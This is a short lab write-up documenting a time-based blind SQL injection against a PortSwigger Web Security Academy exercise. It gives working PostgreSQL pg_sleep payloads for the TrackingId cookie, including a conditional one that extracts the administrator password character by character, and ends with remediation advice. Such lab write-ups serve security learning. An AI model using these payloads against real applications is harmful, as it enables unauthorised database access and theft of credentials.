# Proof of Concept: Blind SQL Injection in PortSwigger Lab

## Overview
This report documents a successful **Time-Based Blind SQL Injection** exploit against a PortSwigger Web Security Academy lab. The vulnerability allows an attacker to extract hidden database information by triggering conditional time delays.

## Vulnerability Details
- **Target:** PortSwigger Lab (Blind SQLi with time delays)
- **Category:** Blind SQL Injection
- **Database:** PostgreSQL (assumed based on time delay syntax)
- **Vulnerable Parameter:** `TrackingId` (cookie)

## Step-by-Step Exploitation

### 1. Vulnerability Identification
The application uses a `TrackingId` cookie for user tracking. Injecting a standard payload did not return errors or data, indicating a potential blind SQLi scenario.

### 2. Confirming Time-Based Blind SQLi
A payload was injected to trigger a time delay if the SQL query executed successfully:

```TrackingId=x'||(SELECT pg_sleep(10))--;```
Result: The server response was delayed by 10 seconds, confirming the time-based blind SQL injection vulnerability.

###3. Extracting Data with Conditional Delays

To extract the administrator password, a conditional delay was used to test each character:
```TrackingId=x'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--;```

By iterating through characters and positions, the full password was extracted character by character.

### 4.Results

   Extracted Credential: The administrator's password was successfully retrieved.

   Technique Used: Time-based blind SQL injection with conditional delays.

### 5.Impact

An attacker can use this vulnerability to:

   Extract sensitive data from the database without any direct output.

   Gain privileged access to the application as an administrator.

### 6.Remediation

   Use Prepared Statements to separate SQL logic from data.

   Implement strict input validation for all user-supplied input.

   Use minimal database privileges to reduce the impact of a breach

Exploit Author: Ranks123
Date: $(date 2025-9-12)
